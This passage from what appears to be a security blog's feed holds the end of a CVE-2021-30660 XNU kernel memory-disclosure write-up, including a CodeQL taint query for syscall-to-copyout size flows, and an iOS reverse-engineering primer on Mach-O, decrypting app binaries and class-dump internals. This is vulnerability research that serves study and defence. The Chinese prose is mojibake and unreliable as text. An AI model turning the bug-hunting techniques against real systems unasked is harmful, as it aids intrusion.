class="line">        &#125;</span><br><span class="line">        SYSV_MSG_SUBSYS_UNLOCK();</span><br><span class="line">        eval = copyout(&amp;msgpool[next * msginfo.msgssz],</span><br><span class="line">            user_msgp, tlen);</span><br></pre></td></tr></table></figure><p>è¡¥ä¸ä¿è¯äº†ï¼Œåœ¨é8 æ•´æ•°å€çš„æ—¶å€™ï¼Œåªæ‹·è´å‰©ä½™çš„é•¿åº¦çš„æ•°æ®ã€‚</p><h1 id="CodeQL-query"><a href="#CodeQL-query" class="headerlink" title="CodeQL query"></a>CodeQL query</h1><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">import cpp</span><br><span class="line">import semmle.code.cpp.dataflow.TaintTracking</span><br><span class="line">import DataFlow::PathGraph</span><br><span class="line"></span><br><span class="line">// å­˜åœ¨è¯¯æŠ¥ IOKit</span><br><span class="line">predicate isSYSCall(Function f) &#123;</span><br><span class="line">    exists(Macro m |</span><br><span class="line">        m.getName().toUpperCase().regexpMatch("SYS(.)*") and</span><br><span class="line">        m.getLocation().getFile().getBaseName() = "syscall.h" and </span><br><span class="line">        m.getName().indexOf(f.getName()) &gt; 0</span><br><span class="line">    )</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">syscall -&gt; copyout</span></span><br><span class="line"><span class="comment">source : syscall fucntion 's params</span></span><br><span class="line"><span class="comment">sink   : copyout 3rd param(size)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">class Config extends TaintTracking::Configuration &#123;</span><br><span class="line">  Config() &#123; this = "taint size to copy size" &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSource(DataFlow::Node source) &#123;</span><br><span class="line">    exists(LocalVariable lv, Function f |</span><br><span class="line">        isSYSCall(f) and</span><br><span class="line">        lv.getFunction() = f and</span><br><span class="line">        (</span><br><span class="line">            not source.asExpr().(Literal).isConstant()</span><br><span class="line">        ) and</span><br><span class="line">        lv.getAnAccess() = source.asExpr()</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSink(DataFlow::Node sink) &#123;</span><br><span class="line">    exists (FunctionCall fc | </span><br><span class="line">            fc.getTarget().getName() = "copyout" and</span><br><span class="line">            fc.getArgument(2) = sink.asExpr()</span><br><span class="line">        )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from Config cfg, DataFlow::PathNode source, DataFlow::PathNode sink</span><br><span class="line">where cfg.hasFlowPath(source, sink)</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">source</span>, <span class="string">" to "</span>, sink, <span class="string">" in "</span>, source.getNode().getFunction().getName()</span><br></pre></td></tr></table></figure><p>æœ‰è¯¯æŠ¥ï¼Œä½†æ˜¯å¤Ÿç”¨äº†ï¼Œæ›¿æ¢æˆcopyinï¼Œä¹Ÿå¯ä»¥çœ‹çœ‹å…¶ä»–çš„è°ƒç”¨è·¯å¾„ï¼Œä¸è¿‡ç¬”è€…æ²¡å‘ç°ä»€ä¹ˆæœ‰ä»·å€¼çš„ä¸œè¥¿ : (</p><h1 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h1><p>CVE-2021-30660 - XNU Kernel Memory Disclosure</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://alexplaskett.github.io/CVE-2021-30660/&quot;&gt;CVE-2021-30660 - XNU Kernel Memory Disclosure&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="XNU" scheme="http://o0xmuhe.me/categories/XNU/"/>
    
    
    <category term="XNU" scheme="http://o0xmuhe.me/tags/XNU/"/>
    
    <category term="CodeQL" scheme="http://o0xmuhe.me/tags/CodeQL/"/>
    
  </entry>
  
  <entry>
    <title>iOS RE 4 beginners 1 - MachO &amp;&amp; class-dump</title>
    <link href="http://o0xmuhe.me/2021/07/11/iOS-RE-4-beginners-1/"/>
    <id>http://o0xmuhe.me/2021/07/11/iOS-RE-4-beginners-1/</id>
    <published>2021-07-11T06:48:13.000Z</published>
    <updated>2021-07-14T09:31:10.422Z</updated>
    
    <content type="html"><![CDATA[<h1 id="roadmap"><a href="#roadmap" class="headerlink" title="roadmap"></a>roadmap</h1><p>ä¹‹å‰åœ¨ <a href="https://iosre.com/">iosre</a>çœ‹åˆ°ä¸€å¼ æ¯”è¾ƒç³»ç»Ÿçš„iOSé€†å‘å­¦ä¹ è·¯çº¿å›¾ï¼Œå› ä¸ºæ¥è§¦è¿‡ä¸€æ®µæ—¶é—´macOSä¸ŠæœåŠ¡çš„æ¼æ´æŒ–æ˜ï¼Œæ‰€ä»¥å¯¹*OSå®‰å…¨è¿˜æ˜¯æŒºæœ‰å…´è¶£çš„ï¼Œä¹Ÿä¸€ç›´æƒ³ç³»ç»Ÿæ€§åœ°å­¦ä¹ ä¸‹iOSé€†å‘ï¼Œä¹‹å‰çš„ä¸€ç›´ä¸æˆä½“ç³»ï¼Œä¹Ÿå¾ˆé›¶ç¢ï¼Œæ­£å¥½å¯¹ç€è¿™ä¸ªå›¾é‡æ„ä¸‹çŸ¥è¯†ä½“ç³»ã€‚</p><a id="more"></a><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/ios_re.png" alt="ios_re"></p><h1 id="macho-file-format"><a href="#macho-file-format" class="headerlink" title="macho file format"></a>macho file format</h1><p>  ç±»ä¼¼Windows/Linuxå¹³å°é€†å‘å­¦ä¹ ï¼Œé¦–å…ˆè¦å­¦ä¹ æ­£å‘å¼€å‘çš„åŸºç¡€çŸ¥è¯†ï¼Œä»¥åŠæ¶‰åŠçš„æ–‡ä»¶æ ¼å¼(æŒ‡å¯æ‰§è¡Œæ–‡ä»¶)ï¼š</p><ul><li>Windows - PE</li><li>Linux - ELF</li><li>*OS - MachO</li></ul><p>æ ¹æ®roadmapä¸­çš„appåˆ†ææµç¨‹ï¼Œç¬¬ä¸€æ­¥å°±æ˜¯â€œç ¸å£³â€œï¼Œå°±æ˜¯åœ¨æ ¹æ®æ–‡ä»¶æ ¼å¼åšæ–‡ç« ï¼Œå› ä¸ºmachoæ–‡ä»¶æ˜¯åŠ å¯†çš„ï¼Œè¢«åŠ è½½åˆ°å†…å­˜æ‰§è¡Œçš„æ—¶å€™æ‰ä¼šè§£å¯†ï¼Œæ‰€ä»¥æˆ‘ä»¬åšé™æ€åˆ†æï¼Œéœ€è¦æŠŠå†…å­˜ä¸­è§£å¯†ä¹‹åçš„å¯æ‰§è¡Œæ–‡ä»¶dumpå‡ºæ¥ï¼Œå¹¶ä¿®å¤æ–‡ä»¶æ‰å¯ä»¥æ‹–å…¥hopper/IDAæ­£å¸¸åˆ†æã€‚</p><h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/Untitled.png" alt="Untitled"></p><p>æˆ‘æ„Ÿè§‰è¿™äº›å¯æ‰§è¡Œæ–‡ä»¶å¤§åŒå°å¼‚çš„å‘³é“ï¼ŒåŸºæœ¬éƒ½æ˜¯æ–‡ä»¶å¤´+å„ç§èŠ‚åŒºã€‚ åœ¨macOSä¸Šä½ å¯ä»¥ä½¿ç”¨ï¼š</p><ul><li>MachOView</li><li>MachOExplorer</li></ul><p>æ¥æŸ¥çœ‹ä¸€ä¸ªmachoæ–‡ä»¶çš„ç»“æ„ï¼Œæ¨èå‰è€…ï¼Œåè€…ä¸çŸ¥é“ä¸ºä»€ä¹ˆæ€»æ˜¯å¡å¡çš„ï¼Œè€Œä¸”å¾ˆå®¹æ˜“å´©æºƒ :(</p><p> æ€»ä½“ä¸Šæ¥çœ‹ï¼Œmachoæ–‡ä»¶æ ¼å¼å¯ä»¥çœ‹åšï¼š</p><ul><li><p>Header</p></li><li><p>Load Commands</p><ul><li>LC_SEGMENT<ul><li>TEXT</li><li>DATA</li><li>LINKEDIT</li></ul></li><li>LC_CODESIGNATURE</li><li>LC_DYLD_INFO_ONLY</li><li>LC_XXXX_DYLIB</li></ul></li><li><p>Data</p><ul><li>Segment(1-n)</li></ul></li></ul><h2 id="Header"><a href="#Header" class="headerlink" title="Header"></a>Header</h2><p>åªå…³æ³¨å‡ ä¸ªåŸºæœ¬å­—æ®µ</p><ul><li>magic number : è¡¨ç¤ºmachoçš„ç±»å‹ï¼ŒFAT, ARMv7,ARM64,x86_64<ul><li>FAT å°±æ˜¯ â€œèƒ–æ–‡ä»¶â€ï¼Œè¡¨ç¤ºè¿™ä¸ªæ–‡ä»¶é‡ŒåŒ…å«äº†å¤šä¸ªæ¶æ„çš„MachOæ–‡ä»¶ï¼Œå¯ä»¥ä½¿ç”¨<code>lipo</code>åˆ†ç¦»</li></ul></li><li>CPU Type, CPU SubType : arch</li><li>Number of load commands : Load commandsçš„æ•°é‡</li><li>flagsï¼šè¡¨ç¤ºä¸€äº›æ ‡è¯†ä½ï¼Œæ¯”å¦‚æ˜¯å¦å¼€äº†PIEï¼Œchecksecå¯ä»¥ä»è¿™é‡Œè·å–ä¸€äº›ä¿¡æ¯ã€‚</li><li>reversedï¼š64ä½ä¿ç•™å­—æ®µ</li></ul><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/CleanShot%202021-07-11%20at%2015.09.41@2x.png" alt="CleanShot 2021-07-11 at 15.09.41@2x"></p><h2 id="Load-Commands"><a href="#Load-Commands" class="headerlink" title="Load Commands"></a>Load Commands</h2><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/CleanShot%202021-07-11%20at%2015.17.40@2x.png" alt="CleanShot 2021-07-11 at 15.17.40@2x"></p><p>å³å‘Šè¯‰æ“ä½œç³»ç»Ÿï¼Œè¯¥å¦‚ä½•åŠ è½½æ–‡ä»¶ä¸­çš„æ•°æ®ã€‚</p><ul><li><strong>LC_SEGMENT_64</strong>ï¼šå®šä¹‰ä¸€ä¸ªæ®µï¼ŒåŠ è½½åè¢«æ˜ å°„åˆ°å†…å­˜ä¸­ï¼ŒåŒ…æ‹¬é‡Œé¢çš„èŠ‚ã€‚ æ¯”å¦‚ä»£ç æ®µ æ•°æ®æ®µ :<ul><li>TEXT ä»£ç æ®µ</li><li>DATA æ•°æ®æ®µ</li></ul></li><li>LC_DYLD_INFO_ONLYï¼šè®°å½•äº†æœ‰å…³é“¾æ¥çš„é‡è¦ä¿¡æ¯ï¼ŒåŒ…æ‹¬åœ¨_LINKEDITä¸­åŠ¨æ€é“¾æ¥ ç›¸å…³ä¿¡æ¯çš„å…·ä½“åç§»å’Œå¤§å°ã€‚ONLYè¡¨ç¤ºè¿™ä¸ªåŠ è½½æŒ‡ä»¤æ˜¯ç¨‹åºè¿è¡Œæ‰€å¿…éœ€çš„ï¼Œå¦‚æœæ—§çš„ é“¾æ¥å™¨æ— æ³•è¯†åˆ«å®ƒï¼Œç¨‹åºå°±ä¼šå‡ºé”™ã€‚</li><li><strong>LC_SYMTAB</strong>ï¼šä¸ºæ–‡ä»¶å®šä¹‰ç¬¦å·è¡¨å’Œå­—ç¬¦ä¸²è¡¨ï¼Œåœ¨é“¾æ¥æ–‡ä»¶æ—¶è¢«é“¾æ¥å™¨ä½¿ç”¨ï¼ŒåŒæ—¶ä¹Ÿç”¨äºè°ƒè¯•å™¨æ˜ å°„ç¬¦å·åˆ°æºæ–‡ä»¶ã€‚ç¬¦å·è¡¨å®šä¹‰çš„æœ¬åœ°ç¬¦å·ä»…ç”¨äºè°ƒè¯•ï¼Œè€Œå·²å®šä¹‰å’Œæœªå®šä¹‰çš„externalç¬¦å·è¢«é“¾æ¥å™¨ä½¿ç”¨ã€‚</li><li>LC_DYSYMTAB:å°†ç¬¦å·è¡¨ä¸­ç»™å‡ºç¬¦å·çš„é¢å¤–ç¬¦å·ä¿¡æ¯æä¾›ç»™åŠ¨æ€é“¾æ¥å™¨ã€‚</li><li><strong>LC_LOAD_DYLINKER</strong>ï¼šé»˜è®¤çš„åŠ è½½å™¨è·¯å¾„ã€‚ <code>/usr/lib/dyld</code></li><li>LC_UUIDï¼šç”¨äºæ ‡è¯†MachOæ–‡ä»¶çš„IDï¼Œä¹Ÿç”¨äºå´©æºƒå †æ ˆå’Œç¬¦å·æ–‡ä»¶çš„å¯¹åº”è§£æã€‚</li><li>LC_VERSION_MIN_IPHONEOSï¼šç³»ç»Ÿè¦æ±‚çš„æœ€ä½ç‰ˆæœ¬ã€‚</li><li>LC_SOURCE_VERSIONï¼šæ„å»ºäºŒè¿›åˆ¶æ–‡ä»¶çš„æºä»£ç ç‰ˆæœ¬å·ã€‚</li><li>LC_MAINï¼šç¨‹åºçš„å…¥å£ã€‚dyldè·å–è¯¥åœ°å€ï¼Œç„¶åè·³è½¬åˆ°è¯¥å¤„æ‰§è¡Œã€‚</li><li><strong>LC_ENCRYPTION_INFO_64</strong>ï¼šæ–‡ä»¶æ˜¯å¦åŠ å¯†çš„æ ‡å¿—ï¼ŒåŠ å¯†å†…å®¹çš„åç§»å’Œå¤§å°ã€‚<ul><li>lldb dump ç ¸å£³ä¿®å¤æ–‡ä»¶ä¹‹åï¼Œéœ€è¦ä¿®æ”¹è¯¥æ ‡è¯†ä½ä»¥ç¡®ä¿æ­£å¸¸åæ±‡ç¼–æ–‡ä»¶ã€‚</li></ul></li><li>LC_LOAD_DYLIB:ä¾èµ–çš„åŠ¨æ€åº“ï¼ŒåŒ…æ‹¬åŠ¨æ€åº“åç§°ã€å½“å‰ç‰ˆæœ¬å·ã€å…¼å®¹ç‰ˆæœ¬å·ã€‚<ul><li>â€œotool -L xxxâ€å‘½ä»¤æŸ¥çœ‹</li></ul></li><li>LC_RPATHï¼š Runpath Search Paths, @rpath æœç´¢çš„è·¯å¾„ã€‚</li><li>LC_FUNCTION_STARTSï¼šå‡½æ•°èµ·å§‹åœ°å€è¡¨ï¼Œä½¿è°ƒè¯•å™¨å’Œå…¶ä»–ç¨‹åºèƒ½å¾ˆå®¹æ˜“åœ°çœ‹åˆ°ä¸€ä¸ªåœ°å€æ˜¯å¦åœ¨å‡½æ•°å†…ã€‚</li><li>LC_DATA_IN_CODEï¼šå®šä¹‰åœ¨ä»£ç æ®µå†…çš„éæŒ‡ä»¤çš„è¡¨ã€‚</li><li><strong>LC_CODE_SIGNATURE</strong>ï¼šä»£ç ç­¾åä¿¡æ¯ã€‚<ul><li>codesign -d [filename]</li></ul></li></ul><h2 id="Data-Segments"><a href="#Data-Segments" class="headerlink" title="Data-Segments"></a>Data-Segments</h2><p>å„ç§èŠ‚åŒºï¼Œæ¯”å¦‚ä»£ç æ®µï¼Œæ•°æ®æ®µï¼Œåªè¯»æ•°æ®æ®µç­‰ï¼š</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/CleanShot%202021-07-11%20at%2015.19.59@2x.png" alt="CleanShot 2021-07-11 at 15.19.59@2x"></p><p>è¿™é‡Œå¯ä»¥çœ‹åˆ°å¾ˆå¤š<code>__DATA, __objc__?</code> èŠ‚åŒºï¼Œ<code>Symbol Table</code> <code>String Table</code>ä¹Ÿå•ç‹¬åˆ—äº†å‡ºæ¥ã€‚</p><ul><li>__objc_protolist</li><li>__objc_classlist</li><li>__objc_catlist section</li><li>â€¦</li></ul><p>è¿™äº›èŠ‚åŒºä¿å­˜äº†OCä¸­ç±»åï¼Œå‡½æ•°åç­‰ä¿¡æ¯ï¼Œè¿™å°±ä¸ºä»MachOä¸­dumpå‡ºæ¥å¤´æ–‡ä»¶æ‰“ä¸‹äº†åŸºç¡€ã€‚</p><h2 id="Get-class-info-from-macho-file"><a href="#Get-class-info-from-macho-file" class="headerlink" title="Get class info from macho file"></a>Get class info from macho file</h2><p><code>__DATA, __objc_protolist</code>èŠ‚åŒºï¼š</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/CleanShot%202021-07-11%20at%2015.30.45@2x.png" alt="CleanShot 2021-07-11 at 15.30.45@2x"></p><p>å­˜å‚¨çš„éƒ½æ˜¯æŒ‡é’ˆï¼ŒæŒ‡å‘ä¸€ä¸ªåˆä¸€ä¸ªprotocolçš„ç»“æ„ï¼Œå¯ä»¥å‚è€ƒobjcçš„ä»£ç  : </p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">protocol_t</span> :</span> objc_object &#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *mangledName;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">protocol_list_t</span> *<span class="title">protocols</span>;</span></span><br><span class="line">    <span class="keyword">method_list_t</span> *instanceMethods;</span><br><span class="line">    <span class="keyword">method_list_t</span> *classMethods;</span><br><span class="line">    <span class="keyword">method_list_t</span> *optionalInstanceMethods;</span><br><span class="line">    <span class="keyword">method_list_t</span> *optionalClassMethods;</span><br><span class="line">    <span class="keyword">property_list_t</span> *instanceProperties;</span><br><span class="line">    <span class="keyword">uint32_t</span> size;   <span class="comment">// sizeof(protocol_t)</span></span><br><span class="line">    <span class="keyword">uint32_t</span> flags;</span><br><span class="line">    <span class="comment">// Fields below this point are not always present on disk.</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> **_extendedMethodTypes;</span><br><span class="line">    ......</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">objc_object</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">isa_t</span> isa;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥æŒ‰ç…§ç»“æ„ä½“ç´¢å¼• <code>__DATA, __objc_protolist</code> é‡ŒæŒ‡é’ˆæŒ‡å‘çš„ä½ç½®çš„æ•°æ®ï¼Œå°±å¯ä»¥è§£æå‡ºæ¥protocolçš„ç±»å‹ï¼Œåå­—ï¼Œæ–¹æ³•ç­‰ä¿¡æ¯ã€‚</p><h1 id="class-dump-read-notes"><a href="#class-dump-read-notes" class="headerlink" title="class-dump read notes"></a>class-dump read notes</h1><h2 id="env"><a href="#env" class="headerlink" title="env"></a>env</h2><p>macos11.4 + xcode12</p><h2 id="compile"><a href="#compile" class="headerlink" title="compile"></a>compile</h2><p>Q : <code>openssl/aes.h</code> not found</p><p>A :  add header file path</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">export LDFLAGS=<span class="string">"-L/usr/local/opt/openssl/lib"</span></span><br><span class="line">export CPPFLAGS=<span class="string">"-I/usr/local/opt/openssl/include"</span></span><br></pre></td></tr></table></figure><p>XCodeä¸­çš„é…ç½®æ˜¯:</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/111.png" alt="111"></p><p>Q : Library not found for -lcrypto</p><p>A :  add the missing dylib</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/fix_crypto.png" alt="fix_crypto"></p><h2 id="raed-amp-amp-debug"><a href="#raed-amp-amp-debug" class="headerlink" title="raed &amp;&amp; debug"></a>raed &amp;&amp; debug</h2><p>æ ¸å¿ƒé€»è¾‘å°±çœ‹</p><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">- (<span class="keyword">void</span>)processObjectiveCData;</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (CDMachOFile *machOFile <span class="keyword">in</span> <span class="keyword">self</span>.machOFiles) &#123;</span><br><span class="line">        CDObjectiveCProcessor *processor = [[[machOFile processorClass] alloc] initWithMachOFile:machOFile];</span><br><span class="line">        [processor process];</span><br><span class="line">        [_objcProcessors addObject:processor];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">- (<span class="keyword">void</span>)process;</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">self</span>.machOFile.isEncrypted == <span class="literal">NO</span> &amp;&amp; <span class="keyword">self</span>.machOFile.canDecryptAllSegments) &#123;</span><br><span class="line">        [<span class="keyword">self</span>.machOFile.symbolTable loadSymbols];</span><br><span class="line">        [<span class="keyword">self</span>.machOFile.dynamicSymbolTable loadSymbols];</span><br><span class="line"></span><br><span class="line">        [<span class="keyword">self</span> loadProtocols];</span><br><span class="line">        [<span class="keyword">self</span>.protocolUniquer createUniquedProtocols];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Load classes before categories, so we can get a dictionary of classes by address.</span></span><br><span class="line">        [<span class="keyword">self</span> loadClasses];</span><br><span class="line">        [<span class="keyword">self</span> loadCategories];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="1-symbolTable-loadSymbols"><a href="#1-symbolTable-loadSymbols" class="headerlink" title="1. symbolTable loadSymbols"></a>1. symbolTable loadSymbols</h2><p>Load Commands é‡Œæ‰¾åˆ° LC_SYMTABï¼Œç„¶åæ‰¾åˆ° __DATA(ä¾èµ–å±æ€§ RW)ã€‚</p><p>ç„¶ååˆ©ç”¨ LC_SYMTAB åˆå§‹åŒ–äº†cursorå¼€å§‹éå†æ‰¾ç¬¦å·ã€‚</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/CleanShot%202021-07-11%20at%2015.47.33@2x.png" alt="CleanShot 2021-07-11 at 15.47.33@2x"></p><p>strtab ä» string table å¼€å§‹ ï¼š ä¸€ä¸ª symbolèµ·å§‹ä½ç½®ï¼Œä¸€ä¸ªstringèµ·å§‹ä½ç½®ã€‚</p><p>ç„¶åæ ¹æ® arm è¿˜æ˜¯ x64 èµ°ä¸åŒçš„é€»è¾‘(è¿™é‡Œç›®æ ‡æ˜¯ARM64çš„Binary) : </p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/CleanShot%202021-07-11%20at%2015.48.18@2x.png" alt="CleanShot 2021-07-11 at 15.48.18@2x"></p><p>å¼€å§‹è§£æ symbol tableï¼Œitem by item</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">string table index  --&gt;  åœ¨string tableé‡Œæ‰¾åˆ°å¯¹åº”çš„ string</span><br><span class="line">type</span><br><span class="line">section index</span><br><span class="line">desc</span><br><span class="line">value</span><br></pre></td></tr></table></figure><p>ç„¶åæ ¹æ®string table indexé‡Œæ‰¾åˆ°å¯¹åº”çš„stringï¼Œæ”¾åˆ°symbolsæ•°ç»„é‡Œï¼Œ</p><p>æ ¹æ® string çš„ value åˆ¤æ–­æ˜¯ä¸æ˜¯ classï¼Œè¿™é‡Œæ˜¯æ ¹æ®å­—ç¬¦ä¸²çš„å¼€å¤´æ˜¯ä¸æ˜¯<code>  @&quot;*OBJC_CLASS*$_&quot;</code>ã€‚</p><p>å¯¹äºè§£æå‡ºæ¥class nameï¼Œæ·»åŠ åˆ° class symbols dicté‡Œï¼Œ<strong>è¿™æ ·å¤„ç†ä¹‹åï¼Œsymbolsï¼Œ classSymbolséƒ½æœ‰äº†ã€‚</strong></p><h2 id="2-dynamicSymbolTable-loadsymbols"><a href="#2-dynamicSymbolTable-loadsymbols" class="headerlink" title="2. dynamicSymbolTable loadsymbols"></a>2. dynamicSymbolTable loadsymbols</h2><p>ç±»ä¼¼1</p><h2 id="3-loadProtocols"><a href="#3-loadProtocols" class="headerlink" title="3. loadProtocols"></a>3. loadProtocols</h2><p>ä» <code>__DATA , __objc_protolist</code> è¯»å– å¯¹åº”çš„value</p><p>æ¯”å¦‚å¾—åˆ°åœ°å€0x1009ccc58</p><p>èµ°åˆ° <code>- (CDOCProtocol *)protocolAtAddress:(uint64_t)address</code></p><p>åˆå§‹åŒ–å¯¹åº”çš„<code>CDOCProtocol</code>å¯¹è±¡</p><p>ä¾èµ–è¿™ä¸ªåœ°å€ï¼Œä»æ–‡ä»¶å¯¹åº”åœ°å€è¯»å–å‡ºæ¥ è¿™ä¸ª <code>proto</code>çš„ç›¸å…³ä¿¡æ¯:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">struct cd_objc2_protocol objc2Protocol;</span><br><span class="line">objc2Protocol.isa                     &#x3D; [cursor readPtr];</span><br><span class="line">objc2Protocol.name                    &#x3D; [cursor readPtr];</span><br><span class="line">objc2Protocol.protocols               &#x3D; [cursor readPtr];</span><br><span class="line">objc2Protocol.instanceMethods         &#x3D; [cursor readPtr];</span><br><span class="line">objc2Protocol.classMethods            &#x3D; [cursor readPtr];</span><br><span class="line">objc2Protocol.optionalInstanceMethods &#x3D; [cursor readPtr];</span><br><span class="line">objc2Protocol.optionalClassMethods    &#x3D; [cursor readPtr];</span><br><span class="line">objc2Protocol.instanceProperties      &#x3D; [cursor readPtr];</span><br><span class="line">objc2Protocol.size                    &#x3D; [cursor readInt32];</span><br><span class="line">objc2Protocol.flags                   &#x3D; [cursor readInt32];</span><br><span class="line">objc2Protocol.extendedMethodTypes     &#x3D; 0;</span><br></pre></td></tr></table></figure><p>name protocolsè¿™äº›å­—æ®µæ˜¯ä¸€ä¸ªåœ°å€ï¼ŒæŒ‡å‘å¯¹åº”çš„å€¼(å­—ç¬¦ä¸²/æ•°ç»„)</p><p>æœ€åå‚ç…§objc2Protocolçš„å€¼ï¼Œåˆ†åˆ«è·å–protocol çš„ nameï¼Œ å„ç§methodsï¼Œå±æ€§ç­‰ï¼Œåˆå§‹åŒ–äº†protocolå¯¹è±¡</p><p>æ‰€ä»¥protocolså°±éƒ½å¤„ç†å‡ºæ¥äº†ï¼Œæœ€åå¾—åˆ°äº†</p><p><code>_protocolsByAddress __NSDictionaryM *   6781 key/value pairs    0x0000000112f93820</code></p><h2 id="4-protocolUniquer-createUniquedProtocols"><a href="#4-protocolUniquer-createUniquedProtocols" class="headerlink" title="4. protocolUniquer createUniquedProtocols"></a>4. protocolUniquer createUniquedProtocols</h2><p>ä¾èµ–3ä¸­æ‰¾åˆ°çš„ <code>_protocolsByAddress</code></p><p>name -&gt; protocol å¯¹åº”å…³ç³»çš„dict addr -&gt; protocol å¯¹åº”å…³ç³»çš„dict</p><p>p1-&gt;protocols é‡Œè¿˜æœ‰protocolï¼Œmergeè¿›æ¥(adopted protocols)</p><ul><li><p>p1 : _name   __NSCFString *  @â€AWEFriendsActivityWidgetConfigurationIntentHandlingâ€  0x0000000112fbc710</p></li><li><p>p2 : _name   NSTaggedPointerString * @â€NSObjectâ€ 0x07518ee6ed78d7f9</p></li></ul><p>@interface AWEFriendsActivityWidgetConfigurationIntentHandling : NSObject { //blablablaâ€¦ }</p><p>è¿™ç§æƒ…å†µ</p><h2 id="5-loadClasses"><a href="#5-loadClasses" class="headerlink" title="5. loadClasses"></a>5. loadClasses</h2><p>è§£æsection ï¼š<code> __DATA   __objc_classlist</code></p><p>å’Œ3ç±»ä¼¼çš„å¥—è·¯ï¼Œå…ˆå¾—åˆ° ä¸€ä¸ª åœ°å€ï¼Œç„¶åæ ¹æ®åœ°å€ï¼Œå»æ–‡ä»¶ä¸­ç´¢å¼•å¯¹åº”çš„ç»“æ„ï¼š</p><p><code>CDOCClass *aClass = [self 